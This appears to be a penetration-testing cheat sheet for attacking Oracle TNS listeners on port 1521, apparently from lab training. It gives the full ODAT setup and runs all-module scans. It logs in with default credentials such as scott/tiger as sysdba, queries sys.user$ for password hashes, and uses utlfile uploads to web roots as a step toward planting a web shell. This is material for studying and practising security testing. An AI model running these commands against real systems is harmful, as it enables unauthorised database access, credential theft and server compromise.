### Oracle Transparent Network Substrate (TNS)
----------------------
TCP 1521
Config:
- $ORACLE_HOME/network/admin
- tnsnames.ora - resolve service names to network addresses
- listener.ora - determine the services it should listen to and the behavior of the listener

nmap scripts:
- oracle-sid-brute

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

ODAT (Oracle Database Attacking Tool)
```shell-session
./odat.py all -s 10.129.204.235
```

Connect:
```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
```shell-session
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V
```
```shell-session
sqlplus scott/tiger@10.129.204.235/XE
```
```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

DBSNMP default password: dbsnmp

Oracle database interactions:
- select table_name from all_tables;
- select * from user_role_privs;

Query database passwords:
```shell-session
select name, password from sys.user$;
```

Upload a web shell:
- /var/www/html (Linux)
- C:\inetpub\wwwroot (Windows)

File upload test:
```shell-session
echo "Oracle File Upload Test" > testing.txt
```
```shell-session
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
```shell-session
curl -X GET http://10.129.204.235/testing.txt
```

